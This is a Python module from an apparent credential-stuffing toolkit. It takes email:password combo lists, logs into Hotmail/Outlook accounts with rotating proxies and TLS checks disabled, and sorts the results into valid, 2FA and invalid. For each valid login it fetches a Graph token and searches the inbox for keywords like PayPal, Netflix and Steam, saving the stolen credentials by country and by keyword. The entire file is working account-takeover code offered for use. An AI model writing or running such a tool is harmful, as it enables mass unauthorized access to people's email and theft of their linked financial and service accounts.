# modules/hotmail_inboxer.py
import sys
import re
import time
import random
import threading
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from core.common import (
    banner, clear, session_dir, Writer, Stats, select_file,
    read_lines, norm_combo, dedupe, ask_threads, run_pool,
    Fore, Style, ROOT
)
from core.proxy import ProxyPool, load_pool_interactive

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 15

FLAGS = {
    'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'FR': '🇫🇷',
    'IT': '🇮🇹', 'ES': '🇪🇸', 'BR': '🇧🇷', 'IN': '🇮🇳', 'JP': '🇯🇵', 'KR': '🇰🇷',
    'CN': '🇨🇳', 'RU': '🇷🇺', 'MX': '🇲🇽', 'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷',
    'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱',
    'CZ': '🇨🇿', 'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪', 'CH': '🇨🇭', 'AT': '🇦🇹',
    'BE': '🇧🇪', 'NZ': '🇳🇿', 'SG': '🇸🇬', 'MY': '🇲🇾', 'ID': '🇮🇩', 'TH': '🇹🇭',
    'VN': '🇻🇳', 'PH': '🇵🇭', 'ZA': '🇿🇦', 'AR': '🇦🇷', 'CL': '🇨🇱', 'CO': '🇨🇴',
}

def flag(code):
    return FLAGS.get((code or "").upper(), "🏴")

def make_session(proxy_url=None):
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3,
                  status_forcelist=[429, 500, 502, 503, 504],
                  allowed_methods=["HEAD", "GET", "POST", "OPTIONS"])
    ad = HTTPAdapter(max_retries=retry, pool_connections=200, pool_maxsize=200)
    s.mount("https://", ad)
    s.mount("http://", ad)
    if proxy_url:
        s.proxies = {"http": proxy_url, "https": proxy_url}
    return s

class MSAccount:
    SFT_URL = ('https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328'
               '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
               '&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch'
               '&response_type=token&locale=en')

    def __init__(self, email, password, pool: ProxyPool, keywords=None):
        self.email = email
        self.password = password
        self.pool = pool
        self.keywords = keywords or []
        self.country = None
        self.name = None
        self.session = None
        self._current_proxy = None

    def _rotate(self):
        if self.session is not None:
            try:
                self.session.close()
            except Exception:
                pass
        self.session = make_session()
        if len(self.pool):
            p = self.pool.get()
            if p:
                self.session.proxies = {"http": p, "https": p}
                self._current_proxy = p

    def _fail_proxy(self):
        if self._current_proxy:
            self.pool.mark_fail(self._current_proxy)

    def _ok_proxy(self):
        if self._current_proxy:
            self.pool.mark_ok(self._current_proxy)

    def _req(self, method, url, **kw):
        for attempt in range(3):
            if self.session is None:
                self._rotate()
            try:
                r = self.session.request(method, url, timeout=TIMEOUT, verify=False, **kw)
                self._ok_proxy()
                return r
            except (requests.exceptions.ProxyError, requests.exceptions.SSLError) as e:
                self._fail_proxy()
                if attempt < 2:
                    self._rotate()
                    continue
                raise
            except requests.exceptions.RequestException:
                if attempt < 2:
                    time.sleep(0.4 + attempt * 0.5)
                    continue
                raise
        return None

    def fetch_sft(self):
        for _ in range(3):
            try:
                r = self._req("GET", self.SFT_URL, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                                  "Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
                })
                if not r:
                    continue
                t = r.text
                ppft = (re.search(r'value=\\\\?"(.+?)\\\\?"', t)
                        or re.search(r'name="PPFT"[^>]*value="(.+?)"', t)
                        or re.search(r"sFTTag:'(.+?)'", t))
                post = (re.search(r'"urlPost":"(.+?)"', t)
                        or re.search(r"urlPost:'(.+?)'", t)
                        or re.search(r'<form[^>]*action="(.+?)"', t))
                if ppft and post:
                    return post.group(1).replace('&amp;', '&'), ppft.group(1)
            except Exception:
                pass
            time.sleep(0.4)
        return None, None

    def login(self):
        url, ppft = self.fetch_sft()
        if not url:
            return "BAD"
        for _ in range(3):
            try:
                r = self._req("POST", url, allow_redirects=True,
                              data={"login": self.email, "loginfmt": self.email,
                                    "passwd": self.password, "PPFT": ppft},
                              headers={
                                  "Content-Type": "application/x-www-form-urlencoded",
                                  "User-Agent": "Mozilla/5.0"
                              })
                if not r:
                    continue
                if '#' in r.url and 'access_token=' in r.url:
                    return "OK"
                body = r.text.lower()
                if any(v in r.text for v in ('recover?mkt', 'identity/confirm?mkt',
                                             'Email/Confirm?mkt', '/Abuse?mkt=')):
                    return "2FA"
                if any(v in body for v in ('password is incorrect', "doesn't exist",
                                           'sign in to your microsoft account',
                                           'too many times with an incorrect')):
                    return "BAD"
            except Exception:
                pass
            time.sleep(0.4)
        return "BAD"

    def graph_token(self):
        try:
            url = ('https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2'
                   '&response_type=token&scope=https://graph.microsoft.com/User.Read '
                   'https://graph.microsoft.com/Mail.Read&redirect_uri='
                   'https://login.live.com/oauth20_desktop.srf&prompt=none')
            r = self._req("GET", url)
            if not r:
                return None
            return parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
        except Exception:
            return None

    def profile(self, token):
        try:
            h = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"}
            r = self._req("GET", "https://graph.microsoft.com/v1.0/me", headers=h)
            if r and r.status_code == 200:
                d = r.json()
                self.country = d.get("country") or None
                self.name = d.get("displayName") or None
                return True
        except Exception:
            pass
        return False

    def inbox(self, token):
        if not token:
            return 0, {}
        h = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"}
        found = {}
        for kw in self.keywords:
            try:
                q = (f'https://graph.microsoft.com/v1.0/me/messages'
                     f'?$search="subject:{kw}"&$select=subject&$top=25')
                r = self._req("GET", q, headers=h)
                if not r or r.status_code != 200:
                    continue
                d = r.json()
                n = d.get('@odata.count') or len(d.get('value', []))
                if n:
                    found[kw] = n
            except Exception:
                continue
        return sum(found.values()), found

def worker(combo, keywords, stats, writer, pool):
    try:
        email, password = combo.split(':', 1)
    except ValueError:
        stats.add("errors"); stats.add("checked"); return

    acc = MSAccount(email, password, pool, keywords)
    try:
        status = acc.login()
    except Exception:
        status = "BAD"

    if status == "BAD":
        stats.add("invalid"); stats.add("checked")
        print(f"{Fore.RED}[-]{Style.RESET_ALL} {email}")
        return

    if status == "2FA":
        stats.add("twofa"); stats.add("checked")
        writer.write("2FA.txt", f"{email}:{password}")
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} {email} {Fore.LIGHTBLACK_EX}| 2fa{Style.RESET_ALL}")
        return

    stats.add("valid")
    writer.write("Valid.txt", f"{email}:{password}")

    token = None
    try:
        token = acc.graph_token()
        if token:
            acc.profile(token)
    except Exception:
        pass

    country = acc.country or "Unknown"
    if country != "Unknown":
        writer.write(f"Countries/{country}.txt", f"{email}:{password}")

    total, hits = 0, {}
    try:
        total, hits = acc.inbox(token)
    except Exception:
        pass

    fl = flag(country)
    if total:
        stats.add("inbox_hits")
        pretty = ", ".join(f"{k}:{v}" for k, v in hits.items())
        writer.write("Inbox.txt", f"{email}:{password} | {country} | {total} | {pretty}")
        for k, v in hits.items():
            safe = re.sub(r'[^A-Za-z0-9._-]', '_', k)
            writer.write(f"Keywords/{safe}.txt", f"{email}:{password} | {country} | {k}:{v}")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {email} "
              f"{Fore.LIGHTBLACK_EX}| {fl}{country} | {pretty} | {total}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {email} "
              f"{Fore.LIGHTBLACK_EX}| {fl}{country} | valid{Style.RESET_ALL}")

    stats.add("checked")

def main():
    clear()
    banner("hotmail / outlook inboxer")

    path = select_file("select combo file (email:pass)")
    if not path:
        print(f"{Fore.RED}[!] no file{Style.RESET_ALL}"); input("enter..."); return

    raw = [norm_combo(l) for l in read_lines(path)]
    raw = [r for r in raw if r]
    combos, dupes = dedupe(raw)
    if not combos:
        print(f"{Fore.RED}[!] no valid combos{Style.RESET_ALL}"); input("enter..."); return

    kp = ROOT / "keywords.txt"
    if not kp.exists():
        kp.write_text("Steam\nNetflix\nPayPal\nAmazon\nSecurity Alert\n", encoding='utf-8')
    keywords = [w.strip() for w in read_lines(kp) if w.strip()] or ["Steam", "Netflix", "PayPal"]

    pool = load_pool_interactive()

    threads = ask_threads(100)

    out = session_dir("inbox")
    writer = Writer(out)
    stats = Stats(total=len(combos), keys=["twofa", "inbox_hits"])

    print(f"{Fore.CYAN}[*] combos {len(combos)} | dupes {dupes} | keywords {len(keywords)} "
          f"| threads {threads} | proxies {len(pool)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] results -> {out}{Style.RESET_ALL}\n")

    run_pool(combos, lambda c: worker(c, keywords, stats, writer, pool),
             threads, stats, name="hotmail")

    writer.close()
    print(f"\n{Fore.GREEN}[+] done | valid {stats.get('valid')} | inbox {stats.get('inbox_hits')} "
          f"| 2fa {stats.get('twofa')} | invalid {stats.get('invalid')} "
          f"| errors {stats.get('errors')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] {out}{Style.RESET_ALL}")
    input("enter...")

if __name__ == "__main__":
    main()
